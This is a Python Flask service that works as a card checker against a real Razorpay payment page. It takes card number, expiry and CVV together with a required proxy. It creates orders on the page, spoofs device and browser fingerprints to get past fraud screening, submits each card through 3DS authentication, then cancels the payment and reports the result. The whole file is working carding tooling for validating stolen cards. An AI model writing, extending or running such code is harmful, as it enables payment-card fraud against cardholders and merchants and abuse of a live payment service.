import os
import requests
import re
import json
import time
import random
import string
import secrets
import hashlib
import urllib3
import base64
from urllib.parse import quote
from flask import Flask, request, jsonify

urllib3.disable_warnings()

app = Flask(__name__)

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

@app.route('/')
def home():
    return jsonify({"status": "Online", "message": "RazorPay API is running"}), 200

@app.route('/razorpay', methods=['GET'])
def check_card():
    cc_data = request.args.get('cc')
    if not cc_data:
        return jsonify({"response": "DEAD | ID: None | No card details provided"}), 400

    proxy_arg = request.args.get('proxy')
    if not proxy_arg or not proxy_arg.strip():
        return jsonify({"response": "DEAD | ID: None | Proxy Required"}), 400
    
    try:
        cc_parts = cc_data.split("|")
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip().zfill(2)
        yy = cc_parts[2].strip()[-2:]
        cvv = cc_parts[3].strip()
        year = int("20" + yy)
    except Exception as e:
        return jsonify({"response": f"DEAD | ID: None | Invalid card format: {str(e)}"}), 400

    brand = get_card_brand(cc)
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10**8)).zfill(8)
    rzp_device_id = f"1.{h}.{ts}.{rnd}"
    BASE62 = string.ascii_letters + string.digits
    rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
    ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'
    BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
    BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"

    session = requests.Session()
    session.headers.update({'Connection': 'close'})
    try:
        session.verify = False
    
        if proxy_arg:
            formatted_proxy = proxy_arg.strip()
            # Handle cases where proxy format is ip:port:user:pass
            if formatted_proxy.count(':') == 3:
                parts = formatted_proxy.split(':')
                formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif not formatted_proxy.startswith(('http://', 'https://')):
                formatted_proxy = f"http://{formatted_proxy}"
            session.proxies = {"http": formatted_proxy, "https": formatted_proxy}

        URL = "https://pages.razorpay.com/iicdelhi"
        AMO = 100
        EMAIL = "CodeXploide2918@gmail.com"
        PHONE = "+917006985755"

        try:
            resp_init = session.get(URL, timeout=12)
            json_match = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
            if not json_match:
                return jsonify({"response": "DEAD | ID: None | Failed to parse initial data from page"})
        
            try:
                init_data = json.loads(json_match.group(1))
            except Exception as e:
                return jsonify({"response": f"DEAD | ID: None | Exception parsing initial data: {str(e)} | Match: {json_match.group(1)[:200]}"}), 200
            kyid = init_data["key_id"]
            plink = init_data["payment_link"]["id"]
            ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
            keyless_header = init_data.get("keyless_header")
            keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')

            headers_order = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://pages.razorpay.com',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua,
            }
            json_order = {
                'line_items': [{'payment_page_item_id': ppid, 'amount': AMO}],
                'notes': {
                    'membership_id': 'Hsjwj',
                    'member_name': 'Sam altamn',
                    'email': EMAIL,
                    'contact_number': PHONE,
                },
            }
            resp_order = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", headers=headers_order, json=json_order, timeout=12)
            try:
                order_data = json.loads(resp_order.text)
            except Exception as e:
                return jsonify({"response": f"DEAD | ID: None | Exception parsing order response: {str(e)} | Status: {resp_order.status_code} | Response: {resp_order.text[:200]}"}), 200
            order_id = order_data["order"]["id"]
            checkout_id = order_id.split("_")[1]

            headers_public = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua,
            }
            params_public = {
                'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
            }
            resp_public = session.get('https://api.razorpay.com/v1/checkout/public', params=params_public, headers=headers_public, timeout=12)

            sessid = find_between(resp_public.text, 'window.session_token="', '";')
            if not sessid:
                m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
                if m: sessid = m.group(1)

            headers_pref = {
                'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            json_pref = {
                'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'downtime', 'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments', 'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization']],
                'query_params': {
                    'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': AMO,
                    'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                    'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                    'order_id': order_id, 'payment_link_id': plink, 'contact': PHONE,
                },
                'action': 'get',
            }
            session.post('https://api.razorpay.com/v2/standard_checkout/preferences', params=params_pref, headers=headers_pref, data=json.dumps(json_pref), timeout=12)

            headers_co = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            data_co = {
                'notes[email]': EMAIL, 'notes[phone]': PHONE[3:], 'payment_link_id': plink,
                'key_id': kyid, 'contact': PHONE, 'email': EMAIL, 'currency': 'INR',
                '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id,
                '_[library]': 'checkoutjs', '_[library_src]': 'no-src', '_[current_script_src]': 'no-src',
                '_[platform]': 'browser', '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows',
                '_[shield][fhash]': h, '_[shield][tz]': '0', '_[device_id]': rzp_device_id,
                '_[build]': BUILD, '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                '_[shield][browser]': 'chrome', '_[request_index]': '0', 'amount': AMO,
                'order_id': order_id, 'method': 'card', 'checkout_id': checkout_id,
            }
            resp_co_order = session.post('https://api.razorpay.com/v1/standard_checkout/checkout/order', params=params_co, headers=headers_co, data=data_co, timeout=12)
            try: coid_local = json.loads(resp_co_order.text).get("checkout_id", checkout_id)
            except: coid_local = checkout_id

            headers_cb = {
                "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, "x-session-token": sessid, "Origin": "https://api.razorpay.com",
                "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            }
            payload_cb = {
                "identifiers": {"merchant": {"country": "IN"}, "card": {"country": "US", "dcc_blacklist": False, "network": brand}, "method": "card", "payment_currency": "INR"},
                "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
            }
            session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", headers=headers_cb, json=payload_cb, timeout=12)

            headers_create = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            token_create = base64.b64encode(json.dumps([{"name": "sardine", "metadata": {"session_id": coid_local}}], separators=(',', ':')).encode()).decode()
            data_create = {
                "user_risk_providers_token": token_create, 'notes[comment]': '', 'notes[email]': EMAIL,
                'notes[phone]': PHONE[3:], 'notes[name]': 'Hell king', 'payment_link_id': plink, 'key_id': kyid,
                'contact': PHONE, 'email': EMAIL, 'currency': 'INR', '_[integration]': 'payment_pages',
                '_[checkout_id]': coid_local, '_[device.id]': rzp_device_id, '_[env]': '', '_[library]': 'checkoutjs',
                '_[library_src]': 'no-src', '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
                '_[platform]': 'browser', '_[referer]': URL, '_[shield][fhash]': h, '_[shield][tz]': '-330',
                '_[device_id]': rzp_device_id, '_[build]': BUILD, '_[shield][os]': 'windows',
                '_[shield][platform]': 'browser', '_[shield][browser]': 'chrome', '_[request_index]': '1',
                'amount': AMO, 'order_id': order_id, 'method': 'card', 'card[number]': cc,
                'card[cvv]': cvv, 'card[name]': 'Hell King', 'card[expiry_month]': mm, 'card[expiry_year]': year,
                'save': '0', 'dcc_currency': 'INR',
            }
            resp_create = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax', params=params_create, headers=headers_create, data=data_create, allow_redirects=True, timeout=12)

            try:
                pay_json = json.loads(resp_create.text)
            except Exception as e:
                return jsonify({"response": f"DEAD | ID: None | Exception parsing payment creation response: {str(e)} | Status: {resp_create.status_code} | Response: {resp_create.text[:200]}"}), 200
            payment_id = pay_json.get("payment_id") or pay_json.get("id")

            if payment_id:
                pid_clean = payment_id.split("_")[1]
                url_auth1 = f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate"
                headers_3ds = {"content-type": "application/x-www-form-urlencoded", "user-agent": ua}
                session.post(url_auth1, headers=headers_3ds, timeout=12)

                time.sleep(1)

                browser_data = {
                    'browser[java_enabled]': 'false', 'browser[javascript_enabled]': 'true', 'browser[timezone_offset]': '0',
                    'browser[color_depth]': str(random.choice([24, 32])),
                    'browser[screen_width]': str(random.choice([1920, 1366, 1536, 1440])),
                    'browser[screen_height]': str(random.choice([1080, 768, 864, 900])),
                    'browser[language]': 'en-US', 'auth_step': '3ds2Auth'
                }
                url_auth_final = f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate"
                session.post(url_auth_final, headers=headers_3ds, data=browser_data, timeout=12)

                headers_fin = {
                    'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                    'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&keyless_header={keyless_header_url}&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                    'User-Agent': ua, 'x-session-token': sessid,
                }
                params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
                resp_final = session.get(f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel", params=params_fin, headers=headers_fin, timeout=12)

                # Try to parse the final response
                try:
                    fin_json = json.loads(resp_final.text)
                    err_desc = fin_json.get("error", {}).get("description")
                    if err_desc:
                        return jsonify({"response": f"DEAD | ID: {payment_id} | {err_desc}"})
                    return jsonify({"response": f"DEAD | ID: {payment_id} | {resp_final.text}"})
                except:
                    return jsonify({"response": f"DEAD | ID: {payment_id} | {resp_final.text}"})
            else:
                try:
                    err_desc = pay_json.get("error", {}).get("description")
                    if err_desc:
                        return jsonify({"response": f"DEAD | ID: None | {err_desc}"})
                    return jsonify({"response": f"DEAD | ID: None | {resp_create.text}"})
                except:
                    return jsonify({"response": f"DEAD | ID: None | {resp_create.text}"})

        except Exception as e:
            return jsonify({"response": f"DEAD | ID: None | Exception: {str(e)}"}), 200

    finally:
        session.close()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
